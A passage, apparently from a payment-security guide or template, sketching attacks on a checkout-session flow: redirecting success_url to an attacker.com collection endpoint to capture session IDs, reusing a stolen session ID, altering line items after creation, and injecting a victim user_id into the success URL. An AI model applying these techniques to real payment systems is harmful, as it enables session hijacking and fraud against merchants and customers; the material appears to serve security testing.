  "success_url": "https://attacker.com/collect?session_id={CHECKOUT_SESSION_ID}"
}
# Steal session ID, reuse for different account

# Attack 2: Reuse checkout session
# Session ID from one user used by another
session_id = "cs_test_stolen123"
# Different user completes payment
# Original user gets access

# Attack 3: Modify line_items after session creation
# If session not properly validated on completion

# Attack 4: success_url parameter injection
{
  "success_url": "https://example.com/success?session_id={CHECKOUT_SESSION_ID}&user_id=victim"
}
# Grant access to victim account instead of attacker
{% endraw %}
</session_manipulation>

